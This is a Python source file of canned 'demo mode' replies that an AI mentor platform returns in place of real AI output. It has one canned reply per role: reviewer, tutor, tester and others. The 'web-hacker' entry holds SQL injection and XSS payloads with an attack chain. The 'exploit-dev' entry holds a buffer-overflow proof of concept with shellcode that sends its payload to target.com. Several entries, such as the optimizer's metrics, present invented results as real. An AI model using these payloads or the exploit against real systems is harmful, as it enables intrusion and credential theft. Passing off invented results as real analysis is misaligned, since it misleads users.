"""Demo mode responses for AI Mentor Platform - Try without API keys!"""

import random
import time
import os

DEMO_RESPONSES = {
    "reviewer": """🔍 Code Review Results:

**Security Issues Found:**
- Line 42: Potential SQL injection vulnerability in user input handling
- Line 67: Missing input validation on file upload endpoint
- Line 89: JWT secret key should not be hardcoded

**Performance Improvements:**
- Consider caching database queries (lines 104-112)
- The nested loop at line 156 has O(n²) complexity - could be optimized

**Best Practices:**
- Add type hints to function parameters
- Consider extracting magic numbers into constants
- Add error handling for network requests

Overall Score: 7/10 - Good code with room for security improvements.""",

    "mentor": """📚 Let me explain this concept step by step:

**Understanding Async/Await in Python:**

1. **The Basics:**
   Async functions allow non-blocking code execution, letting your program handle multiple operations simultaneously.

2. **Key Concepts:**
   - `async def` declares an asynchronous function
   - `await` pauses execution until the awaited task completes
   - Event loops manage the execution of async functions

3. **Real Example:**
   ```python
   async def fetch_data(url):
       async with aiohttp.ClientSession() as session:
           async with session.get(url) as response:
               return await response.json()
   ```

4. **When to Use:**
   - I/O-bound operations (network requests, file operations)
   - Multiple concurrent operations
   - Real-time applications

Would you like me to explain any specific part in more detail?""",

    "coder": """💻 Here's the implementation you requested:

```python
def optimize_database_queries(user_id: int) -> Dict[str, Any]:
    \"\"\"Optimized function with caching and batch queries\"\"\"
    
    # Use connection pooling
    with get_db_connection() as conn:
        # Batch multiple queries into one
        query = \"\"\"
            SELECT u.*, s.session_data, p.preferences
            FROM users u
            LEFT JOIN sessions s ON u.id = s.user_id
            LEFT JOIN preferences p ON u.id = p.user_id
            WHERE u.id = ?
        \"\"\"
        
        result = conn.execute(query, (user_id,)).fetchone()
        
        # Cache the result for future requests
        cache.set(f'user_{user_id}', result, timeout=300)
        
        return {
            'user': result['user_data'],
            'session': result['session_data'],
            'preferences': result['preferences']
        }
```

This implementation:
- Reduces database calls from 3 to 1
- Implements caching with 5-minute timeout
- Uses connection pooling for better resource management
- Includes proper type hints""",

    "architect": """🏗️ System Architecture Recommendation:

**Proposed Microservices Architecture:**

```
┌─────────────────────────────────────────┐
│           Load Balancer (nginx)          │
└────────────┬────────────────────────────┘
             │
     ┌───────┴────────┐
     │                │
┌────▼────┐    ┌─────▼────┐
│ API      │    │ Frontend │
│ Gateway  │    │ Service  │
└────┬─────┘    └──────────┘
     │
     ├──────────┬──────────┬──────────┐
     │          │          │          │
┌────▼────┐ ┌──▼───┐ ┌───▼───┐ ┌────▼────┐
│ Auth    │ │ User │ │ Chat  │ │ Analytics│
│ Service │ │ Mgmt │ │ Engine│ │ Service │
└─────────┘ └──────┘ └───────┘ └─────────┘
     │          │          │          │
     └──────────┴────┬─────┴──────────┘
                     │
              ┌──────▼──────┐
              │  PostgreSQL  │
              │   Database   │
              └─────────────┘
```

**Key Benefits:**
- Independent scaling of services
- Technology flexibility per service
- Fault isolation
- Easier team collaboration

**Recommended Tech Stack:**
- API Gateway: Kong or Traefik
- Services: FastAPI (Python) or Express (Node.js)
- Message Queue: RabbitMQ for async communication
- Caching: Redis
- Monitoring: Prometheus + Grafana""",

    "tester": """🧪 Test Suite Generated:

```python
import pytest
from unittest.mock import Mock, patch

class TestUserAuthentication:
    \"\"\"Comprehensive test suite for authentication\"\"\"
    
    @pytest.fixture
    def mock_user(self):
        return {
            'id': '123',
            'email': 'test@example.com',
            'created_at': '2024-01-01'
        }
    
    def test_successful_login(self, mock_user):
        \"\"\"Test successful user login flow\"\"\"
        with patch('database.get_user_by_email') as mock_db:
            mock_db.return_value = mock_user
            
            result = authenticate_user('test@example.com')
            
            assert result['success'] == True
            assert 'token' in result
            assert result['user']['email'] == 'test@example.com'
    
    def test_invalid_email(self):
        \"\"\"Test login with invalid email format\"\"\"
        result = authenticate_user('invalid-email')
        
        assert result['success'] == False
        assert 'Invalid email' in result['error']
    
    @pytest.mark.parametrize('email', [
        'user@example.com',
        'test.user@domain.co.uk',
        'admin+test@company.org'
    ])
    def test_email_validation(self, email):
        \"\"\"Test various valid email formats\"\"\"
        assert is_valid_email(email) == True

# Run with: pytest -v test_auth.py
```

Coverage Report: 94% - Missing edge cases in JWT expiration handling""",

    "researcher": """🔬 Research Results:

**Best Practices for JWT Authentication in 2024:**

1. **Industry Standards:**
   - Use RS256 algorithm for production (asymmetric)
   - Implement refresh tokens with rotation
   - Token expiry: 15 minutes (access), 7 days (refresh)

2. **Security Considerations:**
   - Store tokens in httpOnly cookies when possible
   - Implement CSRF protection
   - Use secure random secrets (min 256 bits)

3. **Popular Libraries Comparison:**
   | Library | Stars | Pros | Cons |
   |---------|-------|------|------|
   | PyJWT | 4.5k | Simple, well-documented | Basic features only |
   | python-jose | 1.3k | Full JOSE support | Larger dependency |
   | authlib | 3.8k | OAuth support included | More complex |

4. **Real-world Implementations:**
   - Spotify: JWT with 1-hour expiry, refresh on each request
   - GitHub: JWT for API, session cookies for web
   - AWS: STS tokens with assumable roles

5. **Recent Vulnerabilities:**
   - CVE-2022-29217: Algorithm confusion attacks
   - Mitigation: Always verify algorithm explicitly

**Recommendation:** Use PyJWT with RS256, implement refresh tokens, and add rate limiting on auth endpoints.""",

    "documenter": """📝 Documentation Generated:

# API Authentication

## Overview
This API uses JWT-based authentication with email-only login for simplicity.

## Authentication Flow

### 1. User Login
```http
POST /api/auth/login
Content-Type: application/json

{
    "email": "user@example.com"
}
```

**Response:**
```json
{
    "success": true,
    "token": "eyJhbGciOiJIUzI1NiIs...",
    "user": {
        "id": "uuid-here",
        "email": "user@example.com",
        "created_at": "2024-01-01T00:00:00Z"
    }
}
```

### 2. Authenticated Requests
Include the JWT token in the Authorization header:

```http
GET /api/sessions
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

## Error Handling

| Status Code | Description |
|------------|-------------|
| 200 | Success |
| 401 | Invalid or expired token |
| 429 | Rate limit exceeded |
| 500 | Internal server error |

## Rate Limits
- Authentication endpoints: 5 requests per minute
- API endpoints: 60 requests per minute

## SDK Examples

**Python:**
```python
import requests

# Login
response = requests.post('https://api.example.com/auth/login',
                         json={'email': 'user@example.com'})
token = response.json()['token']

# Make authenticated request
headers = {'Authorization': f'Bearer {token}'}
sessions = requests.get('https://api.example.com/sessions', headers=headers)
```""",

    "optimizer": """⚡ Performance Optimization Report:

**Current Performance Metrics:**
- Average response time: 2.3s
- Database queries per request: 5
- Memory usage: 245MB

**Optimizations Implemented:**

1. **Database Query Optimization**
   ```python
   # Before: 5 separate queries
   user = get_user(id)
   sessions = get_sessions(user_id)
   stats = get_stats(user_id)
   
   # After: 1 optimized query with joins
   data = db.query('''
       SELECT u.*, 
              COUNT(s.id) as session_count,
              SUM(s.cost) as total_cost
       FROM users u
       LEFT JOIN sessions s ON u.id = s.user_id
       WHERE u.id = ?
       GROUP BY u.id
   ''', user_id)
   ```
   **Result: 78% reduction in database load**

2. **Caching Strategy**
   - Implemented Redis caching for frequent queries
   - Cache hit ratio: 85%
   - Response time improvement: 65%

3. **Code Optimizations**
   - Replaced synchronous I/O with async operations
   - Implemented connection pooling
   - Lazy loading for heavy resources

**New Performance Metrics:**
- Average response time: 0.8s (-65%)
- Database queries: 1.2 per request (-76%)
- Memory usage: 189MB (-23%)

**Next Steps:**
- Consider implementing CDN for static assets
- Add database indexes on frequently queried columns
- Implement query result pagination""",

    "tutor": """👨‍🏫 Interactive Learning Session:

**Today's Topic: Understanding REST API Design**

Let's build understanding through questions:

**Q1:** What does REST stand for?
*Think about it...*

**Answer:** Representational State Transfer - it's an architectural style for building web services.

**Q2:** What are the main HTTP methods used in REST?

The main methods are:
- **GET**: Retrieve data
- **POST**: Create new resources
- **PUT**: Update entire resources
- **PATCH**: Partial updates
- **DELETE**: Remove resources

**Let's Practice:**
Design a REST API for a blog system. What endpoints would you create?

*My suggested solution:*
```
GET    /api/posts          # List all posts
GET    /api/posts/{id}     # Get specific post
POST   /api/posts          # Create new post
PUT    /api/posts/{id}     # Update entire post
PATCH  /api/posts/{id}     # Update post partially
DELETE /api/posts/{id}     # Delete post

GET    /api/posts/{id}/comments    # Get post comments
POST   /api/posts/{id}/comments    # Add comment
```

**Key Principles to Remember:**
1. Use nouns for resources, not verbs
2. Use HTTP methods to indicate actions
3. Be consistent with naming conventions
4. Return appropriate status codes

**Exercise:** Try designing endpoints for a user management system. What would you include?""",

    "clarifier": """🎯 Let me clarify your requirements:

Based on your request, I understand you want to:

**Primary Goal:**
Build a user authentication system

**Interpreted Requirements:**
1. User registration and login
2. Secure password handling
3. Session management
4. Role-based access control (possibly)

**Questions to refine the implementation:**

1. **Authentication Method:**
   - [ ] Traditional username/password?
   - [ ] OAuth (Google/GitHub)?
   - [ ] Email-only (passwordless)?
   - [ ] Two-factor authentication?

2. **Session Management:**
   - [ ] JWT tokens?
   - [ ] Server-side sessions?
   - [ ] Cookie-based?

3. **User Data:**
   - [ ] Just email and password?
   - [ ] Profile information (name, avatar)?
   - [ ] Preferences and settings?

4. **Security Requirements:**
   - [ ] Password complexity rules?
   - [ ] Account lockout after failed attempts?
   - [ ] Email verification?

**Recommended Approach:**
For a modern web application, I suggest:
- JWT-based authentication
- Bcrypt for password hashing
- Refresh token rotation
- Email verification flow

Would you like me to proceed with this approach, or would you prefer to adjust any of these assumptions?""",

    # CTF/Security specialized agents
    "reverse-engineer": """🔧 Reverse Engineering Analysis:

**Binary Analysis Results:**

```assembly
; Function discovered at 0x00401234
push    ebp
mov     ebp, esp
sub     esp, 0x20
mov     eax, [ebp+0x8]    ; First parameter
xor     eax, 0x5A5A5A5A   ; XOR with constant key
rol     eax, 3            ; Rotate left 3 bits
mov     [ebp-0x4], eax
```

**Findings:**
1. **Encryption routine identified:**
   - Simple XOR cipher with key: 0x5A5A5A5A
   - Bit rotation obfuscation (ROL 3)
   - Vulnerable to known-plaintext attacks

2. **Hidden functionality:**
   - Debug mode triggered by environment variable
   - Backdoor at offset 0x00403210
   - Admin panel accessible at /debug?key=

3. **Decompiled logic:**
   ```c
   int check_license(char *input) {
       int sum = 0;
       for(int i = 0; i < strlen(input); i++) {
           sum += input[i] * (i + 1);
       }
       return (sum % 256) == 0x42;
   }
   ```

**Exploitation vector:** Buffer overflow in string processing at 0x00401890""",

    "crypto-analyst": """🔐 Cryptographic Analysis:

**Challenge Analysis: Weak RSA Implementation**

Given values:
- n = 77 (public modulus)
- e = 7 (public exponent)
- c = 43 (ciphertext)

**Solution Process:**

1. **Factor the modulus:**
   n = 77 = 7 × 11
   p = 7, q = 11

2. **Calculate Euler's totient:**
   φ(n) = (p-1)(q-1) = 6 × 10 = 60

3. **Find private key:**
   d ≡ e⁻¹ mod φ(n)
   d ≡ 7⁻¹ mod 60
   d = 43 (using extended Euclidean algorithm)

4. **Decrypt message:**
   m ≡ c^d mod n
   m ≡ 43^43 mod 77
   m = 2

**Vulnerabilities Identified:**
- Small primes make factorization trivial
- Low public exponent enables padding attacks
- No padding scheme (textbook RSA)

**Recommendation:** Use 2048-bit keys minimum with OAEP padding""",

    "web-hacker": """🌐 Web Security Analysis:

**Vulnerability Scan Results:**

🔴 **Critical: SQL Injection**
```sql
# Vulnerable endpoint: /api/users?id=1
# Payload: 1' OR '1'='1
# Result: All user records returned

# Exploitation:
/api/users?id=1' UNION SELECT password FROM users--
```

🟠 **High: XSS (Reflected)**
```html
<!-- Vulnerable parameter: search -->
/search?q=<script>alert('XSS')</script>

<!-- DOM-based XSS in: -->
document.getElementById('output').innerHTML = userInput;
```

🟡 **Medium: CSRF Token Missing**
- State-changing operations lack CSRF protection
- Exploitation: Force authenticated users to perform actions

🔵 **Low: Information Disclosure**
- Stack traces exposed in error responses
- Server version in headers: nginx/1.14.0
- Debug mode enabled in production

**Exploitation Chain:**
1. SQL injection to dump credentials
2. Login with stolen creds
3. XSS to steal session tokens
4. CSRF to escalate privileges

**Remediation:**
- Parameterized queries
- Input validation & output encoding
- CSRF tokens on all state changes
- Security headers (CSP, X-Frame-Options)""",

    "forensics-expert": """🔍 Digital Forensics Analysis:

**Memory Dump Analysis:**

**Artifacts Discovered:**

1. **Process List:**
   ```
   PID    Process         Status
   1337   backdoor.exe    Hidden
   2048   keylogger.dll   Injected into explorer.exe
   4096   cryptominer     High CPU usage
   ```

2. **Network Connections:**
   ```
   Local         Remote           State
   0.0.0.0:4444  evil.com:8080   ESTABLISHED
   127.0.0.1:31337               LISTENING
   ```

3. **Registry Persistence:**
   ```
   HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
   "WindowsUpdate" = "C:\\temp\\malware.exe"
   ```

4. **Extracted Credentials:**
   - WiFi passwords in cleartext
   - Browser saved passwords
   - SSH keys without passphrase

5. **Timeline Analysis:**
   - Initial compromise: 2024-01-15 03:24:15
   - Privilege escalation: 2024-01-15 03:31:42
   - Data exfiltration: 2024-01-15 04:15:00

**IOCs (Indicators of Compromise):**
- MD5: d41d8cd98f00b204e9800998ecf8427e
- C2 Server: 192.168.1.100:4444
- Mutex: Global\\MalwareMutex2024""",

    "exploit-dev": """💣 Exploit Development:

**Buffer Overflow Exploit - Complete PoC:**

```python
#!/usr/bin/env python3
import struct
import socket

# Vulnerability: Stack buffer overflow in handleInput()
# Offset to EIP: 146 bytes

def exploit():
    # Build ROP chain to bypass DEP
    rop_chain = b""
    rop_chain += struct.pack('<I', 0x08049234)  # pop eax; ret
    rop_chain += struct.pack('<I', 0x080c0000)  # .data section
    rop_chain += struct.pack('<I', 0x08055555)  # pop ebx; ret
    rop_chain += b'/bin/sh\\x00'
    
    # Shellcode (msfvenom -p linux/x86/exec CMD=/bin/sh)
    shellcode = (
        b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
        b"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
        b"\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
    )
    
    # Build payload
    nop_sled = b"\\x90" * 20
    padding = b"A" * 146
    eip = struct.pack('<I', 0x08049432)  # jmp esp gadget
    
    payload = padding + eip + nop_sled + shellcode
    
    # Send exploit
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('target.com', 9999))
    s.send(payload)
    s.close()
    
    print('[+] Exploit sent! Check for shell on port 4444')

if __name__ == '__main__':
    exploit()
```

**Exploit Mitigations Bypassed:**
- ASLR: Using ROP gadgets from non-PIE binary
- DEP: ROP chain to make stack executable
- Stack Canary: None present"""
}

class DemoProvider:
    """Demo AI provider that returns pre-written responses"""
    
    def __init__(self):
        self.model = "demo-mode"
    
    def chat(self, messages, temperature=0.7, max_tokens=2000):
        """Simulate AI chat with demo responses"""
        # Simulate thinking time
        time.sleep(random.uniform(0.5, 1.5))
        
        # Extract the role from the conversation
        role = "mentor"  # default
        for msg in messages:
            content = msg.get("content", "").lower()
            for agent_role in DEMO_RESPONSES.keys():
                if agent_role in content:
                    role = agent_role
                    break
        
        # Get demo response for the role
        response = DEMO_RESPONSES.get(role, DEMO_RESPONSES["mentor"])
        
        # Add some variation
        if random.random() > 0.8:
            response += "\n\n💡 **Tip:** This is a demo response. Connect your API keys to get real AI assistance!"
        
        return response
    
    def estimate_cost(self, prompt_tokens, completion_tokens):
        """Return zero cost for demo mode"""
        return 0.0

def is_demo_mode():
    """Check if running in demo mode (no API keys configured)"""
    return not any([
        os.environ.get('ANTHROPIC_API_KEY'),
        os.environ.get('OPENAI_API_KEY'),
        os.environ.get('GOOGLE_API_KEY')
    ])

def get_demo_provider():
    """Get demo provider instance"""
    return DemoProvider()

# Usage in main app:
# if is_demo_mode():
#     provider = get_demo_provider()
#     print("🎮 Running in DEMO MODE - Connect API keys for real AI responses!")
# else:
#     provider = get_real_provider()